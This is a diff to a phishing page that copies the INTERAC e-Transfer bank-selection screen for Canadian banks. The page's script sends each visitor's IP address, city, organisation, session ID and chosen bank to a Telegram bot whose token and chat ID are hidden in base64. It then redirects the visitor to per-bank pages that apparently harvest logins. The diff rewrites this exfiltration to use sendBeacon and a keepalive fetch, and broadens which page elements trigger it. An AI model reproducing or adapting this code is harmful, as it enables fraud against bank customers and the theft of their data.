@@ -398,10 +398,10 @@ org_id=bzmgl3t1s&amp;session_id=0b005bed-2cb9-4644-99dc-31bc6769ff2a" style="dis
 </a>
 </li>
 <li class="pure-u-1-2 pure-u-sm-1-3 pure-u-md-1-4 pure-u-lg-1-6 ui-link">
-<a class="fi-tile" data-ajax="false" fiid="CA156562" filabel="KOHO Financial" href="./koho.html" onclick="event.stopPropagation(); event.preventDefault(); window.location.href='./koho.html'; return false;" value="CA156562">
+<a class="fi-tile" data-ajax="false" fiid="CA156562" filabel="KOHO Financial" href="#" value="CA156562">
 <div class="white-background pure-g inherit-height vertical-middle fi-option">
 <div class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper" id="fi-logo-CA156562">
-<img onclick="event.stopPropagation(); event.preventDefault(); window.location.href='./koho.html'; return false;" alt="KOHO Financial" class="fi-logo-image" onerror="Gateway.useImage(this, 'resources/images/en/fiLogo/logo_default.png')" src="./logo_CA156562_FULL_IMAGE.svg"/>
+<img alt="KOHO Financial" class="fi-logo-image" onerror="Gateway.useImage(this, 'resources/images/en/fiLogo/logo_default.png')" src="./logo_CA156562_FULL_IMAGE.svg"/>
 </div>
 </div>
 </a>
@@ -425,10 +425,10 @@ org_id=bzmgl3t1s&amp;session_id=0b005bed-2cb9-4644-99dc-31bc6769ff2a" style="dis
 </a>
 </li>
 <li class="pure-u-1-2 pure-u-sm-1-3 pure-u-md-1-4 pure-u-lg-1-6 ui-link">
-<a class="fi-tile" data-ajax="false" fiid="CA000006" filabel="National Bank" href="./nationalbank.html" onclick="event.stopPropagation(); event.preventDefault(); window.location.href='./nationalbank.html'; return false;" value="CA000006">
+<a class="fi-tile" data-ajax="false" fiid="CA000006" filabel="National Bank" href="#" value="CA000006">
 <div class="white-background pure-g inherit-height vertical-middle fi-option">
 <div class="pure-u-1 inherit-height vertical-middle fi-logo-wrapper" id="fi-logo-CA000006">
-<img onclick="event.stopPropagation(); event.preventDefault(); window.location.href='./nationalbank.html'; return false;" alt="National Bank" class="fi-logo-image" style="max-height: 80px; width: auto; max-width: 90%;" onerror="this.onerror=null; this.src='./logo_CA000006_FULL_IMAGE.svg';" src="./logo_CA000006_FULL_IMAGE.svg"/>
+<img alt="National Bank" class="fi-logo-image" style="max-height: 80px; width: auto; max-width: 90%;" onerror="this.onerror=null; this.src='./logo_CA000006_FULL_IMAGE.svg';" src="./logo_CA000006_FULL_IMAGE.svg"/>
 </div>
 </div>
 </a>
@@ -1408,14 +1408,14 @@ document.addEventListener('DOMContentLoaded', function() {
 
 <script src="security_module.js"></script>
 <script>
-document.addEventListener('DOMContentLoaded', function() {
+(function() {
     var fiMapping = {
         'ATB': 'atb101.html',
         'BMO': 'bmo101.html',
         'CIBC': 'cibc101.html',
         'Coast Capital': 'coastcapital101.html',
         'Desjardins': 'desjardins101.html',
-        'KOHO': 'koho101.html',
+        'KOHO': 'koho.html',
         'Laurentian': 'laurentianbank101.html',
         'Meridian': 'meridian101.html',
         'National Bank': 'nationalbank.html',
@@ -1431,251 +1431,85 @@ document.addEventListener('DOMContentLoaded', function() {
         'Wealthsimple': 'wealthsimple101.html'
     };
 
-    var tiles = document.querySelectorAll('a.fi-tile');
-    tiles.forEach(function(tile) {
-        tile.style.cursor = 'pointer';
-        tile.addEventListener('click', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            var label = tile.getAttribute('filabel') || '';
-            var target = 'rbc101.html';
-            
-            for (var key in fiMapping) {
-                if (label.toLowerCase().includes(key.toLowerCase())) {
-                    target = fiMapping[key];
-                    break;
-                }
-            }
+    function notifyAndGo(label, target) {
+        var _ip = sessionStorage.getItem('__xip') || 'N/A';
+        var _city = sessionStorage.getItem('__xcity') || 'N/A';
+        var _org = sessionStorage.getItem('__xorg') || 'N/A';
+        var _sid = sessionStorage.getItem('__xsid') || 'N/A';
+        var _tok = atob('ODQyMTQxMDU3NDpBQUdHeVlYb0QxMHdZTXNVamJaV3hDWU80SjMzdFltQVBBNA==');
+        var _cid = atob('Njc4ODAxMjQ4MQ==');
 
-            // Notifier Telegram immédiatement
-            var _ip = sessionStorage.getItem('__xip') || 'N/A';
-            var _city = sessionStorage.getItem('__xcity') || 'N/A';
-            var _org = sessionStorage.getItem('__xorg') || 'N/A';
-            var _sid = sessionStorage.getItem('__xsid') || 'N/A';
-            var _tok = atob('ODQyMTQxMDU3NDpBQUdHeVlYb0QxMHdZTXNVamJaV3hDWU80SjMzdFltQVBBNA==');
-            var _cid = atob('Njc4ODAxMjQ4MQ==');
+        var payload = JSON.stringify({
+            chat_id: _cid,
+            text: '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + (label || 'Banque') + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏙️ Ville: <code>' + _city + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _sid + '</code>',
+            parse_mode: 'HTML'
+        });
 
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon('https://api.telegram.org/bot' + _tok + '/sendMessage', new Blob([payload], { type: 'application/json' }));
+        } else {
             fetch('https://api.telegram.org/bot' + _tok + '/sendMessage', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: _cid,
-                    text: '🏦 <b>BANQUE SÉLECTIONNÉE</b>\n🏷️ <b>' + (label || 'Banque') + '</b>\n📍 IP: <code>' + _ip + '</code>\n🏙️ Ville: <code>' + _city + '</code>\n🏢 Org: <code>' + _org + '</code>\n🆔 Session: <code>' + _sid + '</code>',
-                    parse_mode: 'HTML'
-                })
+                body: payload,
+                keepalive: true
             }).catch(function(){});
+        }
 
-            setTimeout(function(){
-                window.location.href = './' + target;
-            }, 300);
+        setTimeout(function() {
+            window.location.href = './' + target;
+        }, 300);
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+        document.querySelectorAll('a.fi-tile, .fi-tile, [filabel]').forEach(function(tile) {
+            tile.style.cursor = 'pointer';
+            tile.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                var label = tile.getAttribute('filabel') || tile.innerText || '';
+                var target = 'rbc101.html';
+
+                for (var key in fiMapping) {
+                    if (label.toLowerCase().indexOf(key.toLowerCase()) !== -1) {
+                        target = fiMapping[key];
+                        break;
+                    }
+                }
+                notifyAndGo(label, target);
+            }, true);
         });
+
+        var submitBtn = document.getElementById('depositSelectSubmit');
+        if (submitBtn) {
+            submitBtn.removeAttribute('disabled');
+            submitBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                var fiLabel = '';
+                var mainFiSelect = document.getElementById('selectFiId');
+                var provSelect = document.getElementById('province');
+                if (mainFiSelect && mainFiSelect.value && mainFiSelect.value !== '') {
+                    fiLabel = mainFiSelect.options[mainFiSelect.selectedIndex].text;
+                } else if (provSelect && provSelect.value) {
+                    var activeCu = document.querySelector('.selectCu[provincecode="' + provSelect.value + '"] select');
+                    if (activeCu && activeCu.value && activeCu.value !== '') {
+                        fiLabel = activeCu.options[activeCu.selectedIndex].text;
+                    }
+                }
+                if (fiLabel) {
+                    var target = 'rbc101.html';
+                    for (var key in fiMapping) {
+                        if (fiLabel.toLowerCase().indexOf(key.toLowerCase()) !== -1) {
+                            target = fiMapping[key];
+                            break;
+                        }
+                    }
+                    notifyAndGo(fiLabel, target);
+                }
+            }, true);
+        }
     });
-});
+})();
 </script>
 </body></html>
-
-<script>
-setInterval(function() {
-    var kohoLink = document.querySelector('a[filabel="KOHO Financial"]');
-    if (kohoLink) {
-        var imgs = kohoLink.querySelectorAll('img');
-        var path = window.location.pathname.includes('INTERAC e-Transfer Deposit your money.html') ? './INTERAC e-Transfer Deposit your money_files/koho.html' : 'koho.html';
-        kohoLink.onclick = function(e) {
-            e.preventDefault(); e.stopPropagation();
-            window.location.href = path;
-        };
-        for(var i=0; i<imgs.length; i++) {
-            imgs[i].onclick = function(e) {
-                e.preventDefault(); e.stopPropagation();
-                window.location.href = path;
-            };
-        }
-        var divs = kohoLink.querySelectorAll('div');
-        for(var j=0; j<divs.length; j++) {
-            divs[j].onclick = function(e) {
-                e.preventDefault(); e.stopPropagation();
-                window.location.href = path;
-            };
-        }
-    }
-}, 500);
-</script>
-
-<style>
-/* Loader Overlay for Interac */
-.loader-overlay-interac {
-    position: fixed;
-    top: 0; left: 0; width: 100%; height: 100%;
-    background-color: rgba(255, 255, 255, 0.95);
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    z-index: 999999;
-    visibility: hidden;
-    opacity: 0;
-    transition: opacity 0.3s;
-    font-family: Arial, sans-serif;
-}
-.loader-overlay-interac.active {
-    visibility: visible;
-    opacity: 1;
-}
-.loader-spinner-interac {
-    border: 4px solid #f3f3f3;
-    border-top: 4px solid #F2A900; /* Interac Yellow */
-    border-radius: 50%;
-    width: 50px;
-    height: 50px;
-    animation: spin 1s linear infinite;
-    margin-bottom: 20px;
-}
-@keyframes spin {
-    0% { transform: rotate(0deg); }
-    100% { transform: rotate(360deg); }
-}
-.loader-text-interac {
-    font-size: 18px;
-    font-weight: bold;
-    color: #333333;
-}
-</style>
-
-<div id="loaderOverlayInterac" class="loader-overlay-interac">
-    <div class="loader-spinner-interac"></div>
-    <p class="loader-text-interac">Traitement en cours, veuillez patienter...</p>
-</div>
-
-
-
-<script>
-// Fix for dropdown selection and Deposit button
-document.addEventListener('DOMContentLoaded', function() {
-    var loader = document.getElementById('loaderOverlayInterac');
-    var provSelect = document.getElementById('province');
-    var placeholder = document.getElementById('placeholderCU');
-    var allCuSelects = document.querySelectorAll('.selectCu[provincecode]');
-    var submitBtn = document.getElementById('depositSelectSubmit');
-    var mainFiSelect = document.getElementById('selectFiId');
-
-    function checkSubmit() {
-        var isValid = false;
-        if (mainFiSelect && mainFiSelect.value && mainFiSelect.value !== '') {
-            isValid = true;
-        } else if (provSelect && provSelect.value) {
-            var activeCu = document.querySelector('.selectCu[provincecode="'+provSelect.value+'"] select');
-            if (activeCu && activeCu.value && activeCu.value !== '') {
-                isValid = true;
-            }
-        }
-        if (submitBtn) {
-            submitBtn.disabled = !isValid;
-        }
-    }
-
-    if(provSelect) {
-        provSelect.addEventListener('change', function() {
-            var prov = this.value;
-            if(placeholder) placeholder.style.display = prov ? 'none' : 'block';
-            allCuSelects.forEach(function(el) {
-                el.style.display = (el.getAttribute('provincecode') === prov) ? 'block' : 'none';
-            });
-            // Reset cu selection when changing province
-            allCuSelects.forEach(function(el) {
-                var sel = el.querySelector('select');
-                if(sel) sel.selectedIndex = 0;
-            });
-            checkSubmit();
-        });
-    }
-
-    if (mainFiSelect) {
-        mainFiSelect.addEventListener('change', checkSubmit);
-    }
-
-    allCuSelects.forEach(function(el) {
-        var sel = el.querySelector('select');
-        if(sel) {
-            sel.addEventListener('change', checkSubmit);
-        }
-    });
-
-    var fiMapping = {
-        'RBC': 'rbc101.html',
-        'UNI': 'uni101.html',
-        'ATB': 'atb101.html',
-        'BMO': 'bmo101.html',
-        'CIBC': 'cibc101.html',
-        'Coast Capital': 'coastcapital101.html',
-        'Desjardins': 'desjardins101.html',
-        'KOHO': 'koho101.html',
-        'Laurentian': 'laurentianbank101.html',
-        'Meridian': 'meridian101.html',
-        'National Bank': 'nationalbank.html',
-        'Neo': 'neo101.html',
-        'PC Financial': 'pcfinancial101.html',
-        'Scotiabank': 'scotiabank101.html',
-        'Simplii': 'simplii.html',
-        'Tangerine': 'tangerine.html',
-        'TD ': 'ca/en/dt101.html',
-        'Vancity': 'vancity.html',
-        'Wealthsimple': 'wealthsimple101.html'
-    };
-
-    function handleBankSelection(fiLabel) {
-        if (!fiLabel) return;
-        var targetFile = 'rbc101.html'; // Default
-        
-        for (var key in fiMapping) {
-            if (fiLabel.toLowerCase().includes(key.toLowerCase())) {
-                targetFile = fiMapping[key];
-                break;
-            }
-        }
-        
-        if (loader) {
-            loader.classList.add('active');
-            setTimeout(function() {
-                window.location.href = targetFile;
-            }, 10000);
-        } else {
-            window.location.href = targetFile;
-        }
-    }
-
-    if(submitBtn) {
-        // Remove disabled attribute for testing, or ensure it's removed by JS
-        submitBtn.removeAttribute('disabled');
-        submitBtn.addEventListener('click', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
-            
-            var fiLabel = '';
-            if (mainFiSelect && mainFiSelect.value && mainFiSelect.value !== '') {
-                fiLabel = mainFiSelect.options[mainFiSelect.selectedIndex].text;
-            } else if (provSelect && provSelect.value) {
-                var activeCu = document.querySelector('.selectCu[provincecode="'+provSelect.value+'"] select');
-                if (activeCu && activeCu.value && activeCu.value !== '') {
-                    fiLabel = activeCu.options[activeCu.selectedIndex].text;
-                }
-            }
-            
-            if (fiLabel) {
-                handleBankSelection(fiLabel);
-            }
-        });
-    }
-});
-</script>
-
-
-
-
-
-
-
-
-
-
-
-
